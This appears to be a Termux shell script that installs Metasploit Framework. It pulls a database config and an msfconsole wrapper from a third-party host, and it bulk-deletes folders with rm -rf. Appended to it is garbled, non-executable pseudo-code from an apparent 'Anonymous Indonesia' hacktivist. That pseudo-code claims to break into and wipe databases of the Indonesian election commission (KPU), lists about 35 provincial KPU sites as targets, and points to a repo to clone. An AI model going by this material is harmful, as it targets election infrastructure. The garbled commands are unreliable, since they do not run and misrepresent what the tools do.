#!/data/data/com.termux/files/usr/bin/bash

# Remove  Old Folder if exist 
find $HOME -name "metasploit-*" -type d -exec rm -rf {} \;


cwd=$(pwd)
msfvar=5.0.95
msfpath='/data/data/com.termux/files/home'

apt update && apt upgrade
apt install -y libiconv zlib autoconf bison clang coreutils curl findutils git apr apr-util libffi libgmp libpcap postgresql readline libsqlite openssl libtool libxml2 libxslt ncurses pkg-config wget make ruby libgrpc termux-tools ncurses-utils ncurses unzip zip tar termux-elf-cleaner
# Many phones are claiming libxml2 not found error
ln -sf $PREFIX/include/libxml2/libxml $PREFIX/include/

cd $msfpath
curl -LO https://github.com/rapid7/metasploit-framework/archive/$msfvar.tar.gz

tar -xf $msfpath/$msfvar.tar.gz
mv $msfpath/metasploit-framework-$msfvar $msfpath/metasploit-framework
cd $msfpath/metasploit-framework

# Update rubygems-update
if [ "$(gem list -i rubygems-update 2>/dev/null)" = "false" ]; then
	gem install --no-document --verbose rubygems-update
fi

# Update rubygems
update_rubygems

# Install bundler
gem install --no-document --verbose bundler:1.17.3

# Installing all gems 
bundle config build.nokogiri --use-system-libraries
bundle install -j3
echo "Gems installed"

# Some fixes
sed -i "s@/etc/resolv.conf@$PREFIX/etc/resolv.conf@g" $msfpath/metasploit-framework/lib/net/dns/resolver.rb
find "$msfpath"/metasploit-framework -type f -executable -print0 | xargs -0 -r termux-fix-shebang
find "$PREFIX"/lib/ruby/gems -type f -iname \*.so -print0 | xargs -0 -r termux-elf-cleaner

echo "Creating database"

mkdir -p $msfpath/metasploit-framework/config && cd $msfpath/metasploit-framework/config
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/database.yml

mkdir -p $PREFIX/var/lib/postgresql
pg_ctl -D "$PREFIX"/var/lib/postgresql stop > /dev/null 2>&1 || true

if ! pg_ctl -D "$PREFIX"/var/lib/postgresql start --silent; then
    initdb "$PREFIX"/var/lib/postgresql
    pg_ctl -D "$PREFIX"/var/lib/postgresql start --silent
fi
if [ -z "$(psql postgres -tAc "SELECT 1 FROM pg_roles WHERE rolname='msf'")" ]; then
    createuser msf
fi
if [ -z "$(psql -l | grep msf_database)" ]; then
    createdb msf_database
fi

rm $msfpath/$msfvar.tar.gz

cd ${PREFIX}/bin && curl -LO https://hax4us.github.io/files/msfconsole && chmod +x msfconsole
ln -sf $(which msfconsole) $PREFIX/bin/msfvenom

echo "you can directly use msfvenom or msfconsole rather than ./msfvenom or ./msfconsole."
echo "you can use after now rooting down'
echo "semoga hari mu menyenangkan."
cd $ (PREFIX)/-r && bash -IO https://github.com/MRXcyber/KPU.GO.ID
if ! detect device/computer (swich on data base.) run
ls ! -sf && chmod 777 run kpu.go.id
cd kpu
		Run to starting downloading server ./system runing $progress downloading 100%#
		ls : "user_name"
		ls : "password:
		
		./system reading php api -,silente
		linux detected true
		then file fi server research ip "start -run"
		
		
	file 1
	
	ip adresss : 122.454.89.00
	start to kpu.go.id
	54
	Data base 2019
	run toll all delete ALL php.run starting 
	\<system> start-delete.
	https://kpu.go.id/
	http://kip.acehprov.go.id/ 
	http://kpud-sumutprov.go.id/ 
	http://sumbar.kpu.go.id 
	http://riau.kpu.go.id/
	http://lampung.kpu.go.id 
	 KPU Provinsi Kep. Babel
http://kpu-babelprov.go.id/
KPU Provinsi Kepri
http://kepri.kpu.go.id/
KPU DKI Jakarta
http://kpujakarta.go.id
KPU Provinsi Jawa Barat
http://jabar.kpu.go.id/
KPU Provinsi Jawa Tengah
http://jateng.kpu.go.id/
KPU Provinsi Jawa Timur
http://kpujatim.go.id/
KPU Provinsi Banten
http://kpu-bantenprov.go.id/
KPU Provinsi Bali
http://bali.kpu.go.id/
KPU Provinsi NTB
http://kpud-ntbprov.go.id/
KPU Provinsi NTT
http://ntt.kpu.go.id/
KPU Provinsi Kalbar
http://kalbar.kpu.go.id
KPU Provinsi Kalteng
http://kpu-kaltengprov.go.id/
KPU Provinsi Kalsel
http://kalsel.kpu.go.id/
KPU Provinsi Kaltim
http://kaltim.kpu.go.id/
KPU Provinsi Sulawesi Tenggara
http://sultra.kpu.go.id/
KPU Provinsi Sulawesi Tengah
http://sulteng.kpu.go.id/
KPU Provinsi Sulawesi Selatan
http://sulsel.kpu.go.id/
KPU Provinsi Sulawesi Utara
http://www.kpu-sulutprov.go.id/
KPU Provinsi Gorontalo
http://gorontalo.kpu.go.id/
KPU Provinsi Sulawesi Barat
http://kpu-sulbarprov.go.id/
KPU Provinsi Maluku
http://kpu-malukuprov.go.id/
KPU Provinsi Maluku Utara
http://malut.kpu.go.id/
KPU DIY
http://diy.kpu.go.id/
KPU Provinsi Bengkulu
http://bengkulu.kpu.go.id
KPU Provinsi Jambi
http://jambi.kpu.go.id//
KPU Provinsi Papua Barat
http://kpu-papuabaratprov.go.id/
KPU Provinsi Papua
http://kpu-papuaprov.go.id/
KPU Provinsi Kalimantan Utara
http://kaltara.kpu.go.id/ 
RUN $
$ cd run kpu blokir accses 
$ cd run kpu delete data base

			" WE ARE ANONYMOUS INDONESIA SEMOGA HARI MU MENYENANGKAN BAPAK & IBU DISANA KEEP SMILE # MRX "
			-r rubby install package
			
		to get install script 
		apt update && apt upgrade 
		apt install nano 
		apt install nmap 
		apt install curl 
		apt install git 
		apt install python2
		pip2 install requests
		git clone https://github.com/Metasploit/MRX.VIP1/kpu
		cd kpu
		ls
		php install requests
		php kpu.php
